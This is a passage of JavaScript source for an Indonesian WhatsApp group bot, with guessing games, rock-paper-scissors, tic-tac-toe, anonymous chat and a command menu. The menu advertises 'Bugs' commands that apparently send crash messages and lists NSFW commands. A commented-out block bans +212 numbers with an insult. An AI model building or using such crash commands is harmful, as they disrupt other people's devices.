  //GAME tebak kimia Function
conn.tebakkimia = conn.tebakkimia ? conn.tebakkimia : {}  
if(isGroup && from in conn.tebakkimia){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebakkimia[id][1]))
 let isSurender = /^((me)?nyerah|surr?ender)$/i.test(budy)

 if (budy.toLowerCase() == json.lambang.toLowerCase().trim()) {
user.balance += conn.tebakkimia[id][2]
 global.db.data.users[m.sender].exp += 10
   var teks3 = `*GAME TEBAK KIMIA*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebakkimia[id][2]} Money 💸`
   reply (teks3)
 clearTimeout(conn.tebakkimia[id][3])
 delete conn.tebakkimia[id]
 } else if(similarity(budy.toLowerCase(), json.lambang.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 }

  
  
//GAME Caklontong Function
conn.caklontong = conn.caklontong ? conn.caklontong : {}  
if(isGroup && from in conn.caklontong){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.caklontong[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 global.db.data.users[m.sender].exp += conn.caklontong[id][2]
// global.db.data.users[m.sender].tiketcoin += 1
 setReply(`*Benar!*\n+${conn.caklontong[id][2]} XP\n+1500 Money\n${json.deskripsi}`)
 clearTimeout(conn.caklontong[id][3])
 delete conn.caklontong[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}


  //GAME tebak Lagu Function
conn.tebaklagu = conn.tebaklagu ? conn.tebaklagu : {}  
if(isGroup && from in conn.tebaklagu){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebaklagu[id][1]))
 
 if (budy.toLowerCase() == json.judul.toLowerCase().trim()) {
user.balance += conn.tebaklagu[id][2]
 var teks4 = `*GAME TEBAK LAGU*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebaklagu[id][2]} Money 💸`
   reply (teks4)
 clearTimeout(conn.tebaklagu[id][3])
 delete conn.tebaklagu[id]
 } else if(similarity(budy.toLowerCase(), json.judul.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}

  
//GAME tebaktebak Function
conn.tebaktebak = conn.tebaktebak ? conn.tebaktebak : {}  
if(isGroup && from in conn.tebaktebak){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebaktebak[id][1]))
 
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tebaktebak[id][2]
 global.db.data.users[m.sender].exp += 50
var teks5 = `*TEBAK TEBAKAN*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebaktebak[id][2]} Money 💸\n EXP: +50`
// global.db.data.users[m.sender].tiketcoin += 1
reply (teks5)
   clearTimeout(conn.tebaktebak[id][3])
 delete conn.tebaktebak[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}


  //GAME tebak kata Function
conn.tebakkata = conn.tebakkata ? conn.tebakkata : {}  
if(isGroup && from in conn.tebakkata){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebakkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tebakkata[id][2]
 var teks6 = `*GAME TEBAK KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebakkata[id][2]} Money 💸`
   reply (teks6)
 clearTimeout(conn.tebakkata[id][3])
 delete conn.tebakkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}

  
//GAME tebak lirik Function
conn.tebaklirik = conn.tebaklirik ? conn.tebaklirik : {}  
if(isGroup && from in conn.tebaklirik){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let json = JSON.parse(JSON.stringify(conn.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tebaklirik[id][2]
 global.db.data.users[m.sender].exp += 10
   var teks7 = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebaklirik[id][2]} Money 💸\n EXP: +10`
   reply (teks7)
 clearTimeout(conn.tebaklirik[id][3])
 delete conn.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 }

       



  //GAME tebak gambar
conn.tebakgambar = conn.tebakgambar ? conn.tebakgambar : {}  
if(isGroup && from in conn.tebakgambar){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tebakgambar[id][2]
 var teks9 = `*GAME TEBAK GAMBAR*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebakgambar[id][2]} Money 💸`
   reply (teks9)
 clearTimeout(conn.tebakgambar[id][3])
 delete conn.tebakgambar[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}

  
//Game Family 100
conn.family = conn.family ? conn.family : {}
if(isGroup && from in conn.family){
if(!isGroup) {return} 
let similarity = require('similarity')
let threshold = 0.72 // semakin tinggi nilai, semakin mirip
let id =  m.chat
let room = conn.family[id]
let textG = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(textG)
  
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, textG))) >= threshold) return setReply('Dikit lagi!')
 }
if (!isCmd && room.terjawab[index]) {return} 
user.balance += room.winScore
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length

let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0]  : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
     `.trim()
  
conn.sendMessage(from, {text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net']}, {quoted: dev}).then(msg => {
 conn.family[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete conn.family[id] 
//if (isWin || isSurrender) clearTimeout(200000)
}
/*/AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('212')
if (nomerAsing) {
if(!db.data.users[sender].banned.status) {
db.data.users[sender].banned.status = true
db.data.users[sender].banned.reason = "Nomer asing +212"
}
console.log(`Nomer asing dari ${senderNumber}`)
await reply("you are not allowed to using this bot")
if(!isGroup) await conn.sendMessage(from, {text: "stupid"},{quoted: lep})
await conn.chatModify({delete: true,lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]},sender)
return conn.updateBlockStatus(sender, "block") 
} 
	*/

//sendFileUrl
const sendFileFromUrl = async (from, url, caption, dev, men) => {
			let mime = '';
			let res = await axios.head(url)
			mime = res.headers['content-type']
			if (mime.split("/")[1] === "gif") {
				return conn.sendMessage(from, {
					video: await convertGif(url),
					caption: caption,
					gifPlayback: true,
					mentions: men ? men : []
				}, {
					quoted: dev
				})
			}
			let type = mime.split("/")[0] + "Message"
			if (mime.split("/")[0] === "image") {
				return conn.sendMessage(from, {
					image: await getBuffer(url),
					caption: caption,
					mentions: men ? men : []
				}, {
					quoted: dev
				})
			} else if (mime.split("/")[0] === "video") {
				return conn.sendMessage(from, {
					video: await getBuffer(url),
					caption: caption,
					mentions: men ? men : []
				}, {
					quoted: dev
				})
			} else if (mime.split("/")[0] === "audio") {
				return conn.sendMessage(from, {
					audio: await getBuffer(url),
					caption: caption,
					mentions: men ? men : [],
					mimetype: 'audio/mpeg'
				}, {
					quoted: dev
				})
			} else {
				return conn.sendMessage(from, {
					document: await getBuffer(url),
					mimetype: mime,
					caption: caption,
					mentions: men ? men : []
				}, {
					quoted: dev
				})
			}
		}

//ANONYMOUS CHAT
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
//let nono = m.quoted.fakeObj? m.quoted.fakeObj : m
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){

await conn.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
}
	        //Suit PvP
	    conn.suit = conn.suit ? conn.suit : {}
	    let roof = Object.values(conn.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(budy) && isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(budy)) {
	    conn.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, dev)
	    delete conn.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    conn.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) conn.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) conn.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) conn.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    conn.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete conn.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = sender == roof.p
	    let jwb2 = sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(budy) && !roof.pilih && !isGroup) {
	    roof.pilih = reg.exec(budy.toLowerCase())[0]
	    roof.text = budy
	    setReply(`Kamu telah memilih ${budy} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) conn.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(budy) && !roof.pilih2 && !isGroup) {
	    roof.pilih2 = reg.exec(budy.toLowerCase())[0]
	    roof.text2 = budy
	    setReply(`Kamu telah memilih ${budy} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) conn.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    conn.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete conn.suit[roof.id]
	    }
	    }
	

  
	
	        //TicTacToei

	    conn.tictac = conn.tictac ? conn.tictac : {}
	    let roomf = Object.values(conn.tictac).find(roomf => roomf.id && roomf.tictac && roomf.state && roomf.id.startsWith('tictactoe') && [roomf.tictac.playerX, roomf.tictac.playerO].includes(sender) && roomf.state == 'PLAYING')
	    if (roomf) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(budy)) return
	    isSurrender = !/^[1-9]$/.test(budy)
	    if (sender !== roomf.tictac.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = roomf.tictac.turn(sender === roomf.tictac.playerO, parseInt(budy) - 1))) {
	    setReply ({
	    '-3': '*TICTACTOE TELAH BERAKHIR*',
	    '-2': '*INVALID*',
	    '-1': '*POSISI INVALID*',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (sender === roomf.tictac.winner) isWin = true
	    else if (roomf.tictac.board === 511) isTie = true
	    let arr = roomf.tictac.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    roomf.tictac._currentTurn = sender === roomf.tictac.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? roomf.tictac.currentTurn : roomf.tictac.winner
	    let str = `*TICTACTOE*

 ID: ${roomf.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} *MENANG!*` : isTie ? `*HASIL SERI*` : `Giliran ${['❌', '⭕'][1 * roomf.tictac._currentTurn]} (@${roomf.tictac.currentTurn.split('@')[0]})`}
❌: @${roomf.tictac.playerX.split('@')[0]}
⭕: @${roomf.tictac.playerO.split('@')[0]}

`
	    if ((roomf.tictac._currentTurn ^ isSurrender ? roomf.x : roomf.o) !== m.chat)
	    roomf[roomf.tictac._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (roomf.x !== roomf.o)  conn.sendText(roomf.x, str, m, { mentions: parseMention(str) } )
	     conn.sendText(roomf.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete conn.tictac[roomf.id]
	    }
      }
	async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const { default: { Image }} = await import('node-webpmux')
	const img = new Image()
	const json = { 'sticker-pack-id': 'parel-kntll', 'sticker-pack-name': packname, 'sticker-pack-publisher': author, 'emojis': categories, 'is-avatar-sticker': 1, ...extra }
	let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
	let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
	let exif = Buffer.concat([exifAttr, jsonBuffer])
	exif.writeUIntLE(jsonBuffer.length, 14, 4)
	await img.load(buffer)
	 img.exif = exif
	return await img.save(null)
}


// ==========================================================\\
if (!publik && !isOwner) return;
try{
switch(command) {
case 'menu': case 'dracula': {
    await loading(); 
    try {
        const menu = `
> *𝚄𝚂𝙴𝚁 𝙸𝙽𝙵𝙾* :
> *𝙽𝙰𝙼𝙴* : ${pushname}
> *𝚂𝚃𝙰𝚃𝚄𝚂* : ${isPremium ? 'Premium' : 'Free'}

> *𝙱𝙾𝚃 𝙸𝙽𝙵𝙾* :
> *𝙱𝙾𝚃𝙽𝙰𝙼𝙴* : ${botName}
> *𝙼𝙾𝙳𝙴* : ${publik ? "Public" : "Self"}
> *𝚁𝚄𝙽 𝙾𝙽* : ${runWith} 

> *𝙳𝙰𝚃𝙴/𝚃𝙸𝙼𝙴 :*
> *${calender}*
> *${timeWib}*

––––––『 *𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂* 』––––––
${readmore}

𝙸𝙽𝙵𝙾:
➣ 𝔯𝔲𝔫𝔱𝔦𝔪𝔢
➣ 𝔰𝔭𝔢𝔢𝔡
➣ 𝔭𝔦𝔫𝔤
➣ 𝔬𝔴𝔫𝔢𝔯

𝔊𝔯𝔬𝔲𝔭:
➣ 𝔤𝔠𝔦𝔫𝔣𝔬
➣ 𝔩𝔦𝔫𝔨𝔤𝔠
➣ 𝔯𝔢𝔰𝔢𝔱𝔩𝔦𝔫𝔨𝔤𝔠
➣ 𝔞𝔡𝔡
➣ 𝔨𝔦𝔠𝔨
➣ 𝔭𝔯𝔬𝔪𝔬𝔱𝔢
➣ 𝔡𝔢𝔪𝔬𝔱𝔢
➣ 𝔱𝔞𝔤𝔞𝔡𝔪𝔦𝔫
➣ 𝔥𝔦𝔡𝔢𝔱𝔞𝔤
➣ 𝔱𝔞𝔤𝔞𝔩𝔩

𝔇𝔬𝔴𝔫𝔩𝔬𝔞𝔡:
➣ 𝔭𝔩𝔞𝔶
➣ 𝔦𝔫𝔰𝔱𝔞𝔤𝔯𝔞𝔪
➣ 𝔱𝔦𝔨𝔱𝔬𝔨
➣ 𝔪𝔢𝔡𝔦𝔞𝔣𝔦𝔯𝔢
➣ 𝔤𝔡𝔯𝔦𝔳𝔢

𝔄𝔦:
➣ 𝔊𝔢𝔪𝔦𝔫𝔦
➣ 𝔊𝔢𝔪𝔦𝔫𝔦-𝔓𝔯𝔬

𝔖𝔱𝔦𝔠𝔨𝔢𝔯:
➣ 𝔰𝔱𝔦𝔠𝔨𝔢𝔯
➣ 𝔢𝔪𝔬𝔧𝔦𝔪𝔦𝔵
➣ 𝔰𝔪𝔢𝔪𝔢

𝔉𝔲𝔫:
➣ 𝔞𝔯𝔢𝔞𝔠𝔱
➣ 𝔰𝔬𝔲𝔫𝔡𝔰 𝔣𝔯𝔬𝔪 𝔬𝔫𝔢 𝔱𝔬 𝔬𝔫𝔢-𝔥𝔲𝔫𝔡𝔯𝔢𝔡
➣ 𝔯𝔬𝔠𝔨/𝔭𝔞𝔭𝔢𝔯/𝔰𝔠𝔦𝔰𝔰𝔬𝔯𝔰

𝔇𝔬𝔬𝔩𝔰:
➣ 𝔱𝔬𝔲𝔯𝔩
➣ 𝔰𝔰𝔴𝔢𝔟
➣ 𝔤𝔬𝔬𝔤𝔩𝔢
➣ 𝔖𝔥𝔬𝔯𝔱𝔢𝔫
➢ 𝔫𝔬𝔟𝔤
➢ 𝔤𝔦𝔪𝔞𝔤𝔢
➢ 𝔭𝔦𝔫𝔱𝔢𝔯𝔢𝔰𝔱
➢ 𝔤𝔦𝔱𝔰𝔱𝔞𝔩𝔨
➢ 𝔢𝔩𝔢𝔪𝔢𝔫𝔱𝔰

𝔈𝔭𝔥𝔬𝔱𝔬:
➢ 𝔤𝔩𝔦𝔱𝔠𝔥𝔱𝔢𝔵𝔱
➢ 𝔴𝔯𝔦𝔱𝔢𝔱𝔢𝔵𝔱
➢ 𝔞𝔡𝔳𝔞𝔫𝔠𝔢𝔡𝔤𝔩𝔬𝔴
➢ 𝔱𝔶𝔭𝔬𝔤𝔯𝔞𝔭𝔥𝔶𝔱𝔢𝔵𝔱
➢ 𝔭𝔦𝔵𝔢𝔩𝔤𝔩𝔦𝔱𝔠𝔥
➢ 𝔫𝔢𝔬𝔫𝔤𝔩𝔦𝔱𝔠𝔥
➢ 𝔣𝔩𝔞𝔤𝔱𝔢𝔵𝔱
➢ 𝔣𝔩𝔞𝔤3𝔡𝔱𝔢𝔵𝔱
➢ 𝔡𝔢𝔩𝔢𝔱𝔦𝔫𝔤𝔱𝔢𝔵𝔱
➢ 𝔟𝔩𝔞𝔠𝔨𝔭𝔦𝔫𝔨𝔰𝔱𝔶𝔩𝔢
➢ 𝔤𝔩𝔬𝔴𝔦𝔫𝔤𝔱𝔢𝔵𝔱
➢ 𝔲𝔫𝔡𝔢𝔯𝔴𝔞𝔱𝔢𝔯𝔱𝔢𝔵𝔱
➢ 𝔩𝔬𝔤𝔬𝔪𝔞𝔨𝔢𝔯
➢ 𝔠𝔞𝔯𝔱𝔬𝔬𝔫𝔰𝔱𝔶𝔩𝔢
➢ 𝔭𝔞𝔭𝔢𝔯𝔠𝔲𝔱𝔰𝔱𝔶𝔩𝔢
➢ 𝔴𝔞𝔱𝔢𝔯𝔠𝔬𝔩𝔬𝔯𝔱𝔢𝔵𝔱
➢ 𝔢𝔣𝔣𝔢𝔠𝔱𝔠𝔩𝔬𝔲𝔡𝔰
➢ 𝔟𝔩𝔞𝔠𝔨𝔭𝔦𝔫𝔨𝔩𝔬𝔤𝔬
➢ 𝔤𝔯𝔞𝔡𝔦𝔢𝔫𝔱𝔱𝔢𝔵𝔱
➢ 𝔰𝔲𝔪𝔪𝔢𝔯𝔟𝔢𝔞𝔠𝔥
➢ 𝔩𝔲𝔵𝔲𝔯𝔶𝔤𝔬𝔩𝔡
➢ 𝔪𝔲𝔩𝔱𝔦𝔠𝔬𝔩𝔬𝔯𝔢𝔡𝔫𝔢𝔬𝔫
➢ 𝔰𝔞𝔫𝔡𝔰𝔲𝔪𝔪𝔢𝔯
➢ 𝔤𝔞𝔩𝔞𝔵𝔶𝔴𝔞𝔩𝔩𝔭𝔞𝔭𝔢𝔯
➢ 1917𝔰𝔱𝔶𝔩𝔢
➢ 𝔪𝔞𝔨𝔦𝔫𝔤𝔫𝔢𝔬𝔫
➢ 𝔯𝔬𝔶𝔞𝔩𝔱𝔢𝔵𝔱
➢ 𝔣𝔯𝔢𝔢𝔠𝔯𝔢𝔞𝔱𝔢
➢ 𝔤𝔞𝔩𝔞𝔵𝔶𝔰𝔱𝔶𝔩𝔢
➢ 𝔩𝔦𝔤𝔥𝔱𝔢𝔣𝔣𝔢𝔠𝔱𝔰

𝔑𝔖𝔉𝔚:
➢ 𝔫𝔰𝔣𝔴
➢ 𝔱𝔯𝔞𝔭
➢ 𝔥𝔫𝔢𝔨𝔬
➢ 𝔫𝔴𝔞𝔦𝔣𝔲
➢ 𝔞𝔫𝔦𝔪𝔢𝔰𝔭𝔞𝔫𝔨
➢ 𝔰𝔭𝔞𝔫𝔨
➢ 𝔤𝔦𝔣𝔟𝔩𝔬𝔴𝔧𝔬𝔟
➢ 𝔟𝔩𝔬𝔴𝔧𝔬𝔟
➢ 𝔠𝔲𝔠𝔨𝔬𝔩𝔡
➢ 𝔢𝔟𝔞
➢ 𝔭𝔲𝔰𝔰𝔶
➢ 𝔶𝔲𝔯𝔦
➢ 𝔷𝔢𝔱𝔱𝔞𝔦
➢ 𝔥𝔢𝔫𝔱𝔞𝔳𝔦𝔡
➢ 𝔭𝔞𝔭𝔱𝔱

𝔄𝔫𝔦𝔪𝔢:
➢ 𝔱𝔵𝔱2𝔦𝔪𝔤
➢ 𝔯𝔞𝔫𝔡𝔬𝔪𝔞𝔫𝔦𝔪𝔢
➢ 𝔩𝔬𝔩𝔦
➢ 𝔠𝔬𝔰𝔭𝔩𝔞𝔶
➢ 𝔪𝔦𝔩𝔣
➢ 𝔴𝔞𝔩𝔩𝔪𝔩
➢ 𝔭𝔭𝔠𝔭

𝔅𝔲𝔤𝔰:
➢ 𝔰𝔭𝔢𝔠𝔱𝔯𝔢
➢ 𝔡𝔯𝔞𝔠
➢ 𝔲𝔦-𝔣𝔯𝔢𝔢𝔢𝔢
➢ 𝔩𝔬𝔯𝔡

𝔖𝔢𝔱𝔱𝔦𝔫𝔤𝔰:
➢ 𝔯𝔢𝔰𝔱𝔞𝔯𝔱
➢ 𝔞𝔲𝔱𝔬𝔟𝔦𝔬
➢ 𝔟𝔩𝔬𝔠𝔨𝔠𝔪𝔡
➢ 𝔲𝔫𝔟𝔩𝔬𝔠𝔨𝔠𝔪𝔡
➢ 𝔩𝔦𝔰𝔱𝔟𝔩𝔬𝔠𝔨𝔠𝔪𝔡
➢ 𝔞𝔡𝔡𝔢𝔯𝔯𝔬𝔯
➢ 𝔡𝔢𝔩𝔢𝔯𝔯𝔬𝔯
➢ 𝔩𝔦𝔰𝔱𝔢𝔯𝔯𝔬𝔯
➢ 𝔠𝔩𝔢𝔞𝔯𝔰𝔢𝔰𝔰𝔦𝔬𝔫

𝔒𝔴𝔫𝔢𝔯:
➢ 𝔞𝔷𝔞
➢ 𝔯𝔢𝔭𝔬𝔯𝔱𝔟𝔲𝔤
➢ 𝔞𝔲𝔱𝔬𝔱𝔶𝔭𝔢
➢ 𝔞𝔫𝔱𝔦𝔠𝔞𝔩𝔩
➢ 𝔞𝔡𝔡𝔬𝔴𝔫𝔢𝔯
➢ 𝔟𝔩𝔬𝔠𝔨
➢ 𝔲𝔫𝔟𝔩𝔬𝔠𝔨
➢ 𝔠𝔩𝔢𝔞𝔯𝔞𝔩𝔩𝔟𝔩𝔬𝔠𝔨
➢ 𝔅𝔩𝔬𝔠𝔨𝔩𝔦𝔰𝔱
➢ 𝔒𝔫𝔩𝔦𝔫𝔢𝔩𝔦𝔰𝔱
➢ 𝔟𝔠𝔤𝔠
➢ 𝔍𝔬𝔦𝔫
➢ 𝔒𝔲𝔱
➢ 𝔓𝔲𝔟𝔩𝔦𝔠
➢ 𝔖𝔢𝔩𝔣
➢ $

        `;
        
           

const image = fs.readFileSync('./stik/thumb.jpeg'); // Ensure the file path is correct
        await conn.sendMessage(from, {
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `${botName}`,
                    body: `Wagwan ✌️ ${pushname}`,
                    previewType: "PHOTO",
                    thumbnailUrl: "https://pomf2.lain.la/f/dbogd7ch.jpg",
                    sourceUrl: `https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K`
                }
            },
            image: image,
            caption: menu
        }, { quoted: ftoko });

        console.log("Downloading audio from GitHub...");
        const audioUrl = 'https://raw.githubusercontent.com/DRACULAFX/Video/main/menu.mp3';
        const response = await axios.get(audioUrl, { responseType: 'arraybuffer' });
        const audioBuffer = Buffer.from(response.data, 'binary');
        console.log("Audio downloaded successfully. Sending audio...");

        await conn.sendMessage(from, {
            audio: audioBuffer,
            mimetype: 'audio/mp4',
            ptt: true
        }, { quoted: ftoko });

        console.log("Audio sent successfully.");
    } catch (error) {
        console.error("Error in menu command:", error);
        m.reply("An error occurred while processing your request. Please try again.");
    }
    break;
}


case 'imenu': 
case 'idracula': {
    await loading();
    try {
        const menu = `
> *𝚄𝚂𝙴𝚁 𝙸𝙽𝙵𝙾* :
> *𝙽𝙰𝙼𝙴* : ${pushname}
> *𝚂𝚃𝙰𝚃𝚄𝚂* : ${isPremium ? 'Premium' : 'Free'}

> *𝙱𝙾𝚃 𝙸𝙽𝙵𝙾* :
> *𝙱𝙾𝚃𝙽𝙰𝙼𝙴* : ${botName}
> *𝙼𝙾𝙳𝙴* : ${publik ? "Public" : "Self"}
> *𝚁𝚄𝙽 𝙾𝙽* : ${runWith} 

> *𝙳𝙰𝚃𝙴/𝚃𝙸𝙼𝙴 :*
> *${calender}*
> *${timeWib}*

 ––––––『 *𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂* 』––––––
${readmore}

𝙸𝙽𝙵𝙾:
➣ 𝔯𝔲𝔫𝔱𝔦𝔪𝔢
➣ 𝔰𝔭𝔢𝔢𝔡
➣ 𝔭𝔦𝔫𝔤
➣ 𝔬𝔴𝔫𝔢𝔯

𝔊𝔯𝔬𝔲𝔭:
➣ 𝔤𝔠𝔦𝔫𝔣𝔬
➣ 𝔩𝔦𝔫𝔨𝔤𝔠
➣ 𝔯𝔢𝔰𝔢𝔱𝔩𝔦𝔫𝔨𝔤𝔠
➣ 𝔞𝔡𝔡
➣ 𝔨𝔦𝔠𝔨
➣ 𝔭𝔯𝔬𝔪𝔬𝔱𝔢
➣ 𝔡𝔢𝔪𝔬𝔱𝔢
➣ 𝔱𝔞𝔤𝔞𝔡𝔪𝔦𝔫
➣ 𝔥𝔦𝔡𝔢𝔱𝔞𝔤
➣ 𝔱𝔞𝔤𝔞𝔩𝔩

𝔇𝔬𝔴𝔫𝔩𝔬𝔞𝔡:
➣ 𝔭𝔩𝔞𝔶
